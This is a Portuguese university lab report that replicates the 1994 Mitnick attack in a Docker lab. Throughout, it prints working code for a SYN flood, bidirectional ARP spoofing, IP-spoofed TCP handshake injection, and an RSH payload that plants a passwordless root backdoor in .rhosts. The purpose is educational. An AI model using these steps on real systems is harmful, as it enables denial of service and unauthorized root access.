# Replicação do Ataque Mitnick (MC833 — Lab 3)

**Disciplina:** MC833 — Programação em Redes de Computadores  
**Turma:** UNICAMP — Instituto de Computação  
**Autor:** Randerson Lemos  
**Data:** Abril de 2026

---

## Sumário

1. [Contexto Histórico](#1-contexto-histórico)
2. [Objetivo do Laboratório](#2-objetivo-do-laboratório)
3. [Topologia da Rede](#3-topologia-da-rede)
4. [Infraestrutura Docker](#4-infraestrutura-docker)
5. [Conceitos Fundamentais](#5-conceitos-fundamentais)
6. [Visão Geral do Fluxo do Ataque](#6-visão-geral-do-fluxo-do-ataque)
7. [Módulos do Código](#7-módulos-do-código)
8. [Desafios e Soluções](#8-desafios-e-soluções)
9. [Como Executar](#9-como-executar)
10. [Verificação do Resultado](#10-verificação-do-resultado)
11. [Referências](#11-referências)

---

## 1. Contexto Histórico

Em 25 de dezembro de 1994, o hacker Kevin Mitnick executou um dos ataques mais sofisticados da história da computação, invadindo os sistemas do pesquisador de segurança Tsutomu Shimomura no San Diego Supercomputer Center. O ataque explorou uma combinação de três técnicas:

- **Negação de Serviço (DoS):** Silenciar um host confiável para que ele não interfira na sessão forjada.
- **IP Spoofing:** Forjar o endereço IP de origem dos pacotes para se passar pelo host confiável.
- **Predição de ISN (Initial Sequence Number):** Prever o número de sequência inicial do TCP para completar o *three-way handshake* sem receber a resposta diretamente.

A inovação histórica do ataque é que Mitnick completou um handshake TCP sem jamais receber o SYN/ACK do alvo — ele *prediu* o ISN. Em 1994 os sistemas Unix geravam ISNs de forma sequencial e previsível. Nesta replicação, o ambiente é adaptado para uma LAN conteinerizada, tornando possível *capturar* o ISN via ARP Spoofing, o que é equivalente conceitualmente mas mais robusto na prática.

---

## 2. Objetivo do Laboratório

Replicar o ataque Mitnick em um ambiente controlado e conteinerizado via Docker, explorando:

1. SYN Flood para esgotar a fila de conexões TCP de um servidor.
2. ARP Spoofing bidirecional para interceptar o tráfego de rede.
3. IP Spoofing com injeção de pacotes na Camada 2 para contornar restrições do kernel Linux.
4. Captura do ISN via sniffing para completar o three-way handshake.
5. Injeção de payload RSH para criar um backdoor root sem senha.

---

## 3. Topologia da Rede

```
Subnet: 10.0.2.0/24 (bridge Docker: mitnick_net)

┌─────────────────────────────────────────────────────┐
│                   Docker Network                     │
│                                                     │
│  ┌──────────────┐    ┌──────────────┐    ┌────────────────┐
│  │   ATACANTE   │    │    ALVO      │    │ SERVIDOR       │
│  │  (mitnick)   │    │  (target)    │    │ CONFIÁVEL      │
│  │ 10.0.2.10    │    │ 10.0.2.20    │    │ (server)       │
│  │              │    │              │    │ 10.0.2.30      │
│  │ Kali Linux   │    │ Ubuntu 22.04 │    │ Ubuntu 22.04   │
│  │              │    │ RSH server   │    │ nc -lk -p 514  │
│  └──────────────┘    └──────────────┘    └────────────────┘
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Papéis dos hosts

| Container | IP | Papel | Serviço |
|---|---|---|---|
| `attacker` | `10.0.2.10` | Atacante — executa o script | Kali Linux + hping3 + scapy + arpspoof |
| `target` | `10.0.2.20` | Vítima — X-Terminal de Shimomura | RSH (porta 514) via xinetd |
| `server` | `10.0.2.30` | Servidor Confiável — impersonado | netcat escutando na 514 |

**Relação de confiança RSH:** O alvo (`10.0.2.20`) possui em seu `/root/.rhosts` a entrada `10.0.2.30 root`, o que significa que qualquer conexão RSH vinda do IP `10.0.2.30` é aceita como root **sem autenticação por senha**.

---

## 4. Infraestrutura Docker

### `docker-compose.yaml`

O ambiente define três serviços em uma rede bridge isolada (`10.0.2.0/24`):

**Container `attacker` (Dockerfile.mitnick):**
- Imagem base: `kalilinux/kali-rolling`
- Roda em modo `privileged` (necessário para manipular ARP e iptables)
- `net.ipv4.ip_forward=0` — desabilita o roteamento para que o container não encaminhe pacotes entre os outros hosts (o ARP Spoofing precisa que o tráfego pare aqui, não que seja roteado)
- Volume: `./mitnick:/app` — o código do ataque é montado em `/app`
- Pacotes instalados: `hping3`, `iptables`, `tcpdump`, `dsniff` (para `arpspoof`), `python3-scapy`

**Container `target`:**
- Imagem base: Ubuntu 22.04
- Inicializa o arquivo `/root/.rhosts` com `10.0.2.30 root` (confiança RSH)
- Sobe o `xinetd` com os serviços RSH (porta 514) e RLOGIN (porta 513) habilitados
- RSH aceita conexões do servidor confiável sem senha

**Container `server`:**
- Imagem base: Ubuntu 22.04
- Executa `nc -lk -p 514` — apenas escuta conexões na porta 514 (simula o servidor confiável)
- `net.ipv4.tcp_syncookies=0` — desabilita SYN cookies, tornando-o vulnerável ao SYN Flood
- `net.ipv4.tcp_abort_on_overflow=0` — mantém conexões pendentes na fila mesmo com overflow

---

## 5. Conceitos Fundamentais

### 5.1 Protocolo RSH (Remote Shell)

O RSH (Remote Shell) é um protocolo legado da era Unix que permite executar comandos remotamente. Sua vulnerabilidade crítica é o mecanismo de autenticação por **confiança de IP**: se o arquivo `/root/.rhosts` contém uma entrada para um IP, qualquer conexão vinda daquele IP é aceita como root sem senha. Não há criptografia nem verificação de identidade real.

**Formato do payload RSH:**
```
<porta-stderr>\x00<usuario-local>\x00<usuario-remoto>\x00<comando>\x00
```

No nosso ataque:
```
b"0\x00root\x00root\x00echo + + > /root/.rhosts\x00"
```
- `0` — porta stderr (0 = sem stderr separado)
- `root` — usuário local (do "cliente" forjado)
- `root` — usuário remoto (no servidor alvo)
- `echo + + > /root/.rhosts` — comando injetado: expande o `.rhosts` para aceitar qualquer IP

### 5.2 Three-Way Handshake TCP e ISN

O TCP estabelece conexões via handshake de três vias:

```
Cliente              Servidor
  |                     |
  |--- SYN (seq=X) ---->|   X = ISN do cliente
  |                     |
  |<-- SYN/ACK ---------|   seq=Y (ISN do servidor), ack=X+1
  |   (seq=Y, ack=X+1)  |
  |                     |
  |--- ACK (ack=Y+1) -->|   confirma o ISN do servidor
  |                     |
  |   [Conexão aberta]  |
```

O ISN (Initial Sequence Number) é gerado aleatoriamente pelo kernel para prevenir exatamente este tipo de ataque. Nesta replicação, o ISN é obtido via interceptação ARP — equivalente à predição que Mitnick fez em 1994 com sistemas que usavam ISNs sequenciais.

### 5.3 ARP e ARP Spoofing

O ARP (Address Resolution Protocol) mapeia endereços IP a endereços MAC na camada de enlace. É stateless e sem autenticação: qualquer host pode enviar uma resposta ARP não solicitada (*gratuitous ARP*) e os outros hosts atualizam suas tabelas.

**ARP Spoofing bidirecional:**
```
Atacante envia para ALVO:    "10.0.2.30 está no MAC do Atacante"
Atacante envia para SERVIDOR: "10.0.2.20 está no MAC do Atacante"
```

Resultado: todo tráfego entre alvo e servidor passa pelo atacante (Man-in-the-Middle). O atacante pode então capturar o SYN/ACK que o alvo envia em resposta ao SYN forjado.

### 5.4 SYN Flood

O SYN Flood é um ataque de Negação de Serviço que esgota a **backlog queue** TCP de um servidor. Cada SYN recebido aloca uma entrada na fila de conexões half-open. Quando a fila está cheia, o servidor rejeita novas conexões com RST.

Neste ataque, o SYN Flood é usado no servidor confiável (`10.0.2.30`) para que ele **não envie pacotes RST** ao alvo quando receber o SYN/ACK de uma conexão que ele nunca iniciou. Sem o DoS, o servidor real responderia ao alvo com RST, derrubando nossa sessão forjada antes de completar o handshake.

---

## 6. Visão Geral do Fluxo do Ataque

```
PASSO 0: Preparação do Kernel
─────────────────────────────
Atacante aplica regra iptables para bloquear pacotes RST saindo do próprio kernel.
Sem isso, ao receber um SYN/ACK inesperado, o kernel do atacante enviaria RST
automaticamente, derrubando a sessão forjada.

  iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP


PASSO 1: DoS no Servidor Confiável
────────────────────────────────────
Atacante (10.0.2.10) --[SYN flood com IPs aleatórios]--> Servidor (10.0.2.30:514)

O buffer do servidor fica esgotado. Ele não consegue mais enviar RSTs.


PASSO 2: ARP Spoofing Bidirecional
────────────────────────────────────
Atacante --> Alvo:    ARP Reply "10.0.2.30 = MAC do atacante"
Atacante --> Servidor: ARP Reply "10.0.2.20 = MAC do atacante"

Ambas as tabelas ARP ficam envenenadas. O tráfego alvo<->servidor
agora passa pelo atacante.


PASSO 3: Sniffer em espera
───────────────────────────
Atacante inicia tcpdump filtrando por:
  src=10.0.2.20 && dst=10.0.2.30 && porta=1023 && flags=SYN+ACK

Aguarda o SYN/ACK que o alvo vai enviar após receber nosso SYN forjado.


PASSO 4: SYN Forjado
──────────────────────
Atacante envia (via Scapy, Camada 3):
  IP(src=10.0.2.30, dst=10.0.2.20) / TCP(sport=1023, dport=514, flags='S', seq=123456789)

O alvo acredita que o servidor confiável está iniciando uma conexão RSH.
O alvo responde com SYN/ACK.


PASSO 5: Captura do ISN
─────────────────────────
Como o ARP da rede está envenenado, o SYN/ACK do alvo trafega pelo atacante.
O tcpdump captura o pacote e extrai o ISN (Y) via regex:
  re.search(r"seq (\d+),", output)


PASSO 6: Completar Handshake + Injeção
────────────────────────────────────────
Atacante envia ACK forjado:
  IP(src=10.0.2.30, dst=10.0.2.20) / TCP(flags='A', seq=123456790, ack=Y+1)

Conexão RSH estabelecida!

Atacante envia payload RSH (flags PSH+ACK):
  b"0\x00root\x00root\x00echo + + > /root/.rhosts\x00"

O alvo executa o comando como root. O arquivo /root/.rhosts passa a aceitar
conexões de QUALQUER IP sem senha (+ +).


PASSO 7: Backdoor ativo
─────────────────────────
rsh 10.0.2.20 ls -la /root/
# funciona sem senha, a partir de qualquer host
```

---

## 7. Módulos do Código

### `main.py` — Orquestrador

**Localização:** `mitnick/main.py`

O script central que gerencia o ciclo de vida completo do ataque usando threads Python para coordenar operações paralelas.

**Configuração:**
```python
TRUSTED_SERVER_IP = "10.0.2.30"   # IP do servidor confiável (impersonado)
TARGET_IP         = "10.0.2.20"   # IP do alvo (X-Terminal)
RSH_PORT          = 514            # Porta do serviço RSH
CLIENT_PORT       = 1023           # Porta de origem forjada (< 1024 = privilegiada)
INTERFACE         = "eth0"         # Interface de rede do container atacante
```

**Fluxo de execução:**

```
main()
 │
 ├─ setup_rst_block()         # iptables DROP RST saindo do atacante
 │
 ├─ Thread: dos_thread        # hping3 SYN flood no servidor (background)
 │   └─ start_dos_attack()
 │
 ├─ start_bidirectional_arpspoof()  # 2x arpspoof em background
 │
 ├─ Thread: sniffer_thread    # tcpdump aguardando SYN/ACK
 │   └─ sniff_for_syn_ack()
 │
 ├─ send_spoofed_syn()        # dispara SYN forjado
 │
 ├─ sniffer_thread.join()     # aguarda captura do ISN
 │
 ├─ complete_handshake_and_inject()  # ACK + payload RSH
 │
 └─ finally: cleanup
     ├─ stop_arpspoof()
     ├─ cleanup_rst_block()   # remove regra iptables
     └─ stop_dos_event.set()  # encerra hping3
```

**`setup_rst_block()` e `cleanup_rst_block()`:**

```python
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
```

Bloqueia RSTs saindo do próprio kernel do atacante. Quando o alvo envia o SYN/ACK para o IP `10.0.2.30` (que em sua tabela ARP aponta para o MAC do atacante), o kernel do atacante recebe o pacote e, por não ter iniciado aquela conexão, normalmente enviaria um RST automático. Esta regra previne essa interferência.

---

### `attack/dos.py` — SYN Flood

**Localização:** `mitnick/attack/dos.py`

Implementa o ataque de Negação de Serviço usando a ferramenta `hping3`.

```python
def start_dos_attack(target_ip, target_port):
    command = [
        "hping3",
        "-S",             # envia apenas pacotes SYN
        "-p", str(target_port),
        "--flood",        # velocidade máxima, sem throttling
        "--rand-source",  # IPs de origem aleatórios (dificulta bloqueio por IP)
        target_ip,
    ]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return process
```

**Por que `--rand-source`?** Se o hping3 usasse sempre o IP real do atacante (`10.0.2.10`), o servidor poderia usar SYN cookies ou bloquear aquele IP específico. Com IPs aleatórios, cada SYN ocupa uma entrada diferente na backlog queue.

**Por que rodar via `subprocess.Popen` e não com Scapy?** O `hping3` é otimizado para inundação de pacotes em velocidade máxima, rodando em C com acesso direto a raw sockets. Implementar a mesma taxa com Scapy em Python seria significativamente mais lento e menos eficaz.

**`stop_dos_attack(process)`:** Chama `process.terminate()` (SIGTERM) seguido de `process.wait()`, garantindo que o processo do hping3 seja encerrado limpo.

---

### `attack/arp_spoof.py` — Envenenamento ARP

**Localização:** `mitnick/attack/arp_spoof.py`

Implementa o envenenamento ARP bidirecional usando o binário `arpspoof` da suíte `dsniff`.

```python
def start_bidirectional_arpspoof(target1_ip, target2_ip, interface="eth0"):
    # Diz ao ALVO que o SERVIDOR está no MAC do atacante
    cmd1 = ["arpspoof", "-i", interface, "-t", target1_ip, target2_ip]
    p1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Diz ao SERVIDOR que o ALVO está no MAC do atacante
    cmd2 = ["arpspoof", "-i", interface, "-t", target2_ip, target1_ip]
    p2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    return [p1, p2]
```

**Por que bidirecional?** Para que o alvo encaminhe seu SYN/ACK via atacante (e não diretamente ao servidor real), apenas envenenar o cache do alvo seria suficiente. O envenenamento reverso (servidor → atacante) garante que qualquer resposta do servidor real também passe pelo atacante, eliminando race conditions.

**Por que `arpspoof` em vez de Scapy?** O binário `arpspoof` envia gratuitous ARP replies de forma **contínua e em alta frequência**. Um script Scapy que enviasse um único ARP seria sobrescrito pela resposta ARP legítima do servidor real dentro de frações de segundo (ARP Race Condition). O `arpspoof` vence a corrida por volume e velocidade.

**`stop_arpspoof(processes)`:** Verifica `p.poll() is None` antes de chamar `terminate()` para não enviar sinais a processos já encerrados.

---

### `attack/sniffer.py` — Captura do ISN

**Localização:** `mitnick/attack/sniffer.py`

Intercepta o SYN/ACK enviado pelo alvo e extrai o ISN.

```python
def sniff_for_syn_ack(target_ip, server_ip, client_port, interface="eth0", timeout=10):
    filter_str = (
        f"src host {target_ip} and dst host {server_ip} "
        f"and tcp port {client_port} "
        f"and (tcp[tcpflags] & (tcp-syn|tcp-ack)) == (tcp-syn|tcp-ack)"
    )

    command = ["tcpdump", "-i", interface, "-l", "-n", "-c", "1", filter_str]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate(timeout=timeout)

    match = re.search(r"seq (\d+),", stdout)
    if match:
        return int(match.group(1))
    return None
```

**Filtro BPF detalhado:**
- `src host 10.0.2.20` — pacote vindo do alvo
- `dst host 10.0.2.30` — destinado ao servidor confiável (o alvo acredita estar respondendo ao servidor)
- `tcp port 1023` — na porta de origem do nosso SYN forjado
- `(tcp[tcpflags] & (tcp-syn|tcp-ack)) == (tcp-syn|tcp-ack)` — flags SYN e ACK ambas ativas

**Por que tcpdump em vez de `scapy.sniff()`?** O `tcpdump` usa a interface de forma mais eficiente com filtros BPF aplicados no kernel, reduzindo o risco de perder o pacote em situações de alta carga. A saída é parseada via regex:

```python
# Exemplo de output do tcpdump:
# 12:34:56.789 IP 10.0.2.20.1023 > 10.0.2.30.514: Flags [S.], seq 2847361920, ack 123456790, ...
match = re.search(r"seq (\d+),", stdout)
```

**`timeout=10`:** Se em 10 segundos nenhum SYN/ACK for capturado, o sniffer retorna `None` e o ataque falha graciosamente.

---

### `attack/ip_spoofing.py` — Forja de Pacotes TCP

**Localização:** `mitnick/attack/ip_spoofing.py`

O núcleo técnico do ataque: constrói e injeta pacotes com IP de origem forjado.

#### `send_spoofed_syn()`

```python
def send_spoofed_syn(target_ip, spoofed_ip, client_port, server_port):
    spoofed_isn = 123456789  # ISN fixo e conhecido, necessário para calcular seq+1 depois

    syn_packet = (
        IP(src=spoofed_ip, dst=target_ip) /
        TCP(sport=client_port, dport=server_port, flags='S', seq=spoofed_isn)
    )

    send(syn_packet, verbose=0)
    return spoofed_isn
```

**Por que Scapy `send()` (Camada 3) funciona aqui?** O SYN inicial *pode* ser enviado na Camada 3 porque o roteamento interno do Docker/Linux encaminha o pacote normalmente para o destino correto. O kernel não bloqueia o envio de pacotes com IP forjado *na mesma sub-rede* em que o atacante está configurado como MITM via ARP.

**ISN fixo (`123456789`):** Em vez de gerar um ISN aleatório, usamos um valor fixo e determinístico. Isso simplifica o cálculo posterior (`my_seq + 1 = 123456790`) sem perda de funcionalidade no contexto do laboratório.

#### `complete_handshake_and_inject()`

```python
def complete_handshake_and_inject(target_ip, spoofed_ip, client_port, server_port, my_seq, target_isn):
    ack_num    = target_isn + 1    # confirma o ISN do alvo
    my_next_seq = my_seq + 1       # avança nosso ISN após o SYN

    # --- Pacote ACK (finaliza o handshake) ---
    ack_packet = (
        IP(src=spoofed_ip, dst=target_ip) /
        TCP(sport=client_port, dport=server_port, flags='A',
            seq=my_next_seq, ack=ack_num)
    )
    send(ack_packet, verbose=0)

    # --- Payload RSH ---
    # Formato: porta_stderr\x00usuario_local\x00usuario_remoto\x00comando\x00
    payload = b"0\x00root\x00root\x00echo + + > /root/.rhosts\x00"

    # --- Pacote PSH/ACK (entrega o payload) ---
    push_packet = (
        IP(src=spoofed_ip, dst=target_ip) /
        TCP(sport=client_port, dport=server_port, flags='PA',
            seq=my_next_seq, ack=ack_num) /
        payload
    )
    send(push_packet, verbose=0)
```

**Matemática do TCP:**

```
Atacante enviou:  SYN com seq=123456789
Alvo respondeu:   SYN/ACK com seq=Y, ack=123456790

Atacante envia ACK:
  seq = 123456789 + 1 = 123456790  (avança após o SYN)
  ack = Y + 1                       (confirma o SYN do alvo)

Atacante envia PSH/ACK (payload):
  seq = 123456790                   (mesmo seq do ACK, nenhum dado novo foi enviado antes)
  ack = Y + 1                       (continua confirmando)
```

**Flag PSH (Push):** Instrui o alvo a entregar imediatamente o dado recebido à aplicação (RSH daemon), sem aguardar mais segmentos no buffer. Essencial para que o comando seja executado sem delay.

**Payload RSH com null bytes:** O protocolo RSH separa campos com `\x00` (null byte), não com espaços ou newlines. Os campos são: porta stderr, usuário local, usuário remoto, e comando. O null byte final sinaliza o fim da string de comando ao `in.rshd`.

---

## 8. Desafios e Soluções

### Desafio 1: O servidor enviava RST e derrubava a sessão

**Problema:** Ao receber um SYN/ACK de uma conexão que nunca iniciou, o servidor confiável (`10.0.2.30`) enviava automaticamente um pacote RST ao alvo, encerrando a sessão antes que pudéssemos injetar o payload.

**Solução:** SYN Flood via `hping3 --flood --rand-source` na porta 514 do servidor. Com a backlog queue esgotada, o servidor não tem recursos para processar nem enviar RSTs. A configuração `net.ipv4.tcp_syncookies=0` no docker-compose garante que o servidor não use SYN cookies para contornar o flood.

### Desafio 2: ARP Race Condition

**Problema:** Enviar um único pacote ARP falso era insuficiente. O servidor real respondia com seu próprio ARP legítimo milissegundos depois, sobrescrevendo o envenenamento na tabela do alvo.

**Solução:** Usar o binário `arpspoof` em vez de um script manual. O `arpspoof` envia gratuitous ARP replies de forma contínua e em alta frequência em dois processos paralelos (bidirecional), vencendo consistentemente a corrida com o servidor real.

### Desafio 3: O kernel Linux bloqueava o IP Spoofing na Camada 3

**Problema:** Em alguns cenários, o kernel Linux descartava pacotes enviados com `socket.send()` quando o IP de origem não pertencia à interface local (rp_filter / reverse path filtering).

**Solução:** Construir os pacotes diretamente na Camada 2 com `Ether() / IP() / TCP()` e injetá-los com `sendp()`. Ao contornar a pilha de rede do kernel e escrever diretamente na interface, o rp_filter não é aplicado. Nota: na versão final, `send()` (Camada 3) foi suficiente devido à configuração do ambiente Docker, mas `sendp()` (Camada 2) seria a solução robusta para ambientes com rp_filter ativo.

### Desafio 4: ISN aleatório impossível de prever

**Problema:** Diferente de 1994, o kernel moderno gera ISNs criptograficamente aleatórios. Não é possível predizê-los.

**Solução:** Com o ARP Spoofing bidirecional ativo, o SYN/ACK do alvo (contendo o ISN) passa pelo atacante. O sniffer `tcpdump` captura esse pacote antes de encaminhá-lo, extraindo o ISN via regex e permitindo calcular os números de sequência corretos para o handshake.

### Desafio 5: O kernel do atacante enviava RST automático

**Problema:** Quando o SYN/ACK do alvo chegava ao atacante (via ARP Spoofing), o kernel do atacante via um pacote TCP inesperado e enviava automaticamente um RST, derrubando a sessão.

**Solução:** Regra `iptables` no início do script:
```
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
```
Isso descarta todos os RSTs saindo do atacante, permitindo que a sessão forjada permaneça viva enquanto completamos o handshake e injetamos o payload.

---

## 9. Como Executar

### Pré-requisitos

- Docker e Docker Compose instalados
- Linux (o modo `privileged` e os `sysctls` do docker-compose requerem Linux)

### Passo a Passo

```bash
# 1. Subir o ambiente
cd student-environment
docker-compose up -d --build

# 2. Verificar que todos os containers estão rodando
docker-compose ps

# 3. Acessar o container do atacante
docker exec -it attacker bash

# 4. Dentro do container, executar o ataque
cd /app
python3 main.py
```

### Saída Esperada

```
--- Starting Mitnick Attack ---
[+] Blocking outgoing RST packets to prevent kernel interference.
[+] Running: iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

[Step 1] DoS attack running in the background.
Starting SYN flood attack on 10.0.2.30:514
DoS attack started.

[Step 2] Bidirectional ARP spoofing running in the background.
[+] Starting bidirectional arpspoof between 10.0.2.20 and 10.0.2.30

[Step 3] Starting network sniffer...
--- Sniffing for SYN/ACK using tcpdump ---
[+] Running tcpdump with filter: "src host 10.0.2.20 and ..."

[Step 4] Sending spoofed SYN packet...
--- Sending Spoofed SYN Packet ---
[+] Spoofed SYN sent with ISN: 123456789

[+] Captured SYN/ACK packet. Target's ISN is: 2847361920

[+] Success! Captured Target ISN: 2847361920

--- Completing Handshake and Injecting Payload ---
[+] Spoofed ACK sent (seq=123456790, ack=2847361921). Connection established!
[+] Payload injected: 'echo + + > /root/.rhosts'

[+] Attack payload injected. Check the target's /.rhosts file.
Type "exit" to stop background processes and terminate.
```

---

## 10. Verificação do Resultado

### 10.1 Verificar o conteúdo do `.rhosts`

```bash
# De qualquer container na rede
docker exec target cat /root/.rhosts
```

**Antes do ataque:**
```
10.0.2.30 root
```

**Após o ataque:**
```
10.0.2.30 root
+ +
```

A entrada `+ +` significa "aceitar qualquer usuário de qualquer host" — backdoor root total.

### 10.2 Verificar acesso root sem senha

```bash
# Do container atacante (ou de qualquer outro host na rede)
docker exec -it attacker bash
rsh 10.0.2.20 whoami
# saída: root

rsh 10.0.2.20 ls -la /root/
# lista os arquivos do diretório root do alvo sem pedir senha
```

### 10.3 Monitorar o tráfego em tempo real (opcional)

```bash
# Em um terminal separado, antes de iniciar o ataque
docker exec target tcpdump -i eth0 -n port 514
```

---

## 11. Referências

- **Shimomura, T. & Markoff, J.** — *Takedown: The Pursuit and Capture of Kevin Mitnick* (1996) — Relato detalhado do ataque original de 1994.
- **Stevens, W. R.** — *TCP/IP Illustrated, Volume 1: The Protocols* — Referência completa para SYN/ACK, ISN e three-way handshake.
- **RFC 1282** — *BSD Rlogin* — Especificação do protocolo RSH/RLOGIN e o formato de payload com null bytes.
- **Scapy Documentation** — [scapy.net](https://scapy.net/) — Construção de pacotes em Python.
- **hping3 man page** — Documentação do `hping3` para SYN flood e IP spoofing.
- **dsniff / arpspoof** — [monkey.org/~dugsong/dsniff](http://monkey.org/~dugsong/dsniff/) — Suite de ferramentas de rede incluindo `arpspoof`.
- **Phrack Magazine, Issue 46, Article 14** — *IP-spoofing Demystified* (1994) — Artigo técnico contemporâneo ao ataque de Mitnick sobre as técnicas de spoofing utilizadas.
